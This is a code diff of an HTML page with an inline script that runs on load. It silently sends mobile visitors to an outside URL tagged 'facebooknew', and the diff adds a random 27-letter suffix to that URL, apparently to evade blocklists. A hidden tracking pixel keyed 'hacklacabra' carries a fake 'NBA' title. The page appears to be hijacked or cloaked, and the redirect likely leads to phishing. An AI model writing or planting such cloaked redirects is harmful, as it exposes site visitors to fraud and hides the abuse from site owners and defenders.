@@ -10,23 +10,31 @@
   <img src="https://i.ibb.co/ZfSFQnh/viejo-fondo-negro-textura-grunge-papel-tapiz-oscuro-pizarra-pizarra-pared-habitacion.jpg" alt="Image">
 
   <!-- Include the script -->
-<script type="text/javascript">
+  <script type="text/javascript">
     function redireccionarMovil() {
-        // Verificar si el usuario está accediendo desde un dispositivo móvil
         var esDispositivoMovil = /Mobi/i.test(navigator.userAgent);
-
-        // URL de redirección para dispositivos móviles
         var urlRedireccionMovil = "https://alex.xhja.net/?lan=facebooknew&ht=2&counter0=lacabra05";
 
-        // Verificar si es un dispositivo móvil y redirigir
+        // Generar 27 letras aleatorias
+        var letrasAleatorias = "";
+        var caracteresPermitidos = "abcdefghijklmnopqrstuvwxyz";
+
+        for (var i = 0; i < 27; i++) {
+            var indiceAleatorio = Math.floor(Math.random() * caracteresPermitidos.length);
+            letrasAleatorias += caracteresPermitidos.charAt(indiceAleatorio);
+        }
+
+        // Agregar las letras aleatorias al final de la URL de redirección
+        urlRedireccionMovil += letrasAleatorias;
+
         if (esDispositivoMovil) {
             window.location.href = urlRedireccionMovil;
         }
     }
 
-    // Llamar a la función cuando la página haya terminado de cargar
     window.onload = redireccionarMovil;
 </script>
+
   <img src="//whos.amung.us/pingjs/?k=hacklacabra&t= NBA &x=https://nba.com/" style="display:none" alt="">
 </body>
 </html>
